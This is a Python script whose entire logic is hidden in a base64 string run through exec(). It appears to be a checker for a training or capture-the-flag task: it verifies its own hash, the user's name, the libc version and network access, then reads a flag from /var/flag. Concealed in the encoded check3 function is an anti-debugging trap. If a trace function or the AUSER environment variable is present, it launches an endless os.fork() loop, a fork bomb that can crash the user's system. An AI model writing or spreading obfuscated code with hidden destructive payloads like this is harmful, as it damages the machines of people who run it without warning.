#!/usr/bin/env python3

import sys
import os
import re
import getpass
import subprocess
import socket
import hashlib
import uuid
import base64

MD5 = 'f2b99b4214ca1d8a2a3bd8e25c98bd3d'

exec(base64.b64decode('ZGVmIGNoZWNrMCgpOgogICAgd2l0aCBvcGVuKHN5cy5hcmd2WzBdLCAncicpIGFzIGZpOgogICAgICAgIGRhdGEgPSBmaS5yZWFkbGluZXMoKVsxNDpdCiAgICAgICAgCiAgICAgICAgdGV4dCA9ICcnLmpvaW4oZGF0YSkKCiAgICAgICAgaCA9IGhhc2hsaWIubWQ1KCkKICAgICAgICBoLnVwZGF0ZSh0ZXh0LmVuY29kZSgpKQoKICAgICAgICBpZiBub3QgaC5oZXhkaWdlc3QoKSA9PSBNRDU6CiAgICAgICAgICAgIHByaW50KCdZb3UgY2Fubm90IG1vZGlmeSB0aGUgZmlsZScpCiAgICAgICAgICAgIHN5cy5leGl0KC02KQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHByaW50KCdDaGVjayAwIHBhc3NlZCcpCgpkZWYgY2hlY2sxKG5hbWUpOiAgICAKICAgIGlmIG5hbWUgYW5kIGxlbihuYW1lKSA+IDQ6CiAgICAgICAgbmFtZSA9IG5hbWVbOjNdLnN0cmlwKCkudXBwZXIoKQogICAgZWxzZToKICAgICAgICBwcmludCgnSW5jb3JyZWN0IG5hbWUnKQogICAgICAgIHN5cy5leGl0KC0xKQogICAgcHJpbnQoJ0NoZWNrIDEgcGFzc2VkJykgICAgICAgICAgICAKCmRlZiBjaGVjazIobmFtZSk6CiAgICBpZiBub3QgKG5hbWUgaW4gb3MucGF0aC5hYnNwYXRoKHN5cy5hcmd2WzBdKS51cHBlcigpKToKICAgICAgICBwcmludCgnSW5jb3JyZWN0IG5hbWUnKQogICAgICAgIHN5cy5leGl0KC0yKQogICAgcHJpbnQoJ0NoZWNrIDIgcGFzc2VkJykgICAgICAgICAgICAKCgpkZWYgY2hlY2t2ZXIocHRoKToKICAgIGNoayA9IHN1YnByb2Nlc3MuY2hlY2tfb3V0cHV0KFtwdGhdLCBlbmNvZGluZz0nVVRGLTgnKQoKICAgIHYgPSByZS5maW5kYWxsKCdcZFwuXGRcZCcsIGNoay5zcGxpdCgnXG4nKVswXS5zdHJpcCgpKVswXQogICAgcmV0dXJuIHYgPT0gJzIuMjQnCgpkZWYgY2hlY2szKCk6CiAgICBnZXR0cmFjZSA9IGdldGF0dHIoc3lzLCAnZ2V0dHJhY2UnLCBOb25lKQogICAgaWYgZ2V0dHJhY2UgYW5kIGdldHRyYWNlKCkgb3Igb3MuZ2V0ZW52KCdBVVNFUicsICcnKToKICAgICAgICBwcmludCgnQ2hlYXRlcicpCiAgICAgICAgd2hpbGUgVHJ1ZToKICAgICAgICAgICAgb3MuZm9yaygpCiAgICBwcmludCgnQ2hlY2sgMyBwYXNzZWQnKQoKZGVmIGNoZWNrNCgpOgogICAgcCA9IG9zLnJlYWRsaW5rKCcvcHJvYy9zZWxmL2V4ZScpCgogICAgY2hrID0gc3VicHJvY2Vzcy5jaGVja19vdXRwdXQoWydsZGQnLCBwXSwgZW5jb2Rpbmc9J1VURi04JykKCiAgICBmb3IgcGxpbmUgaW4gY2hrLnNwbGl0KCdcbicpOgogICAgICAgIGlmICdsaWJjLnNvLjYnIGluIHBsaW5lOgogICAgICAgICAgICBsaW5lID0gcGxpbmUuc3RyaXAoKS5zcGxpdCgnICcpWzJdCiAgICAgICAgICAgIAogICAgICAgICAgICBpZiBub3QgY2hlY2t2ZXIobGluZSk6CiAgICAgICAgICAgICAgICBwcmludCgnSW5jb3JyZWN0IHN5c3RlbSB2ZXJzaW9uJykKICAgICAgICAgICAgICAgIHN5cy5leGl0KC00KQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcHJpbnQoJ0NoZWNrIDQgcGFzc2VkJykKICAgICAgICAgICAgICAgIHJldHVybgoKICAgIHByaW50KCdJbmNvcnJlY3Qgc3lzdGVtIHZlcnNpb24nKQogICAgc3lzLmV4aXQoLTQpCgpkZWYgY2hlY2s1KCk6CiAgICB0cnk6CiAgICAgICAgc29ja2V0LnNldGRlZmF1bHR0aW1lb3V0KDEpCiAgICAgICAgc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKS5jb25uZWN0KCgneWEucnUnLCA4MCkpCiAgICAgICAgcHJpbnQoJ0NoZWNrIDUgcGFzc2VkJykKCiAgICAgICAgcmV0dXJuIFRydWUKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZXg6CiAgICAgICAgcHJpbnQoJ0luY29ycmVjdCBpbmV0IHNldHRpbmdzJykKICAgICAgICBzeXMuZXhpdCgtNSkKCgpkZWYgY2hlY2s2KG5hbWUpOgogICAgaW1wb3J0IGh3X21vZHVsZQoKICAgIGlmIGh3X21vZHVsZS5kb193b3JrKCkgPiAwOgogICAgICAgIHdpdGggb3BlbignL3Zhci9mbGFnJywgJ3InKSBhcyBmaToKICAgICAgICAgICAgZGF0YSA9IGZpLnJlYWQoKS5zdHJpcCgnXHgwMCcpCgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICB1dWlkX29iaiA9IHV1aWQuVVVJRChkYXRhLCB2ZXJzaW9uPTQpCgogICAgICAgICAgICAgICAgcHJpbnQoZidZb3UgcGFzc2VkIGNoZWNrNiA6IHtuYW1lfS17ZGF0YX0nKQogICAgICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgIGV4Y2VwdCBWYWx1ZUVycm9yOgogICAgICAgICAgICAgICAgcmFpc2UKICAgICAgICAgICAgICAgIHBhc3MKCiAgICBwcmludCgnWW91IGRpZG5cJ3QgY29tcGxldGUgNiB0YXNrJykKICAgIHN5cy5leGl0KC02KQoKCmlmIF9fbmFtZV9fID09ICdfX21haW5fXyc6CiAgICBjaGVjazAoKQogICAgX25hbWUgPSBpbnB1dCgnRW50ZXIgeW91ciBuYW1lOlxuPiAnKS51cHBlcigpCiAgICBjaGVjazEoX25hbWUpCiAgICBjaGVjazIoX25hbWUpCiAgICBjaGVjazMoKQogICAgY2hlY2s0KCkKICAgIGNoZWNrNSgpCiAgICBjaGVjazYoX25hbWUp'))
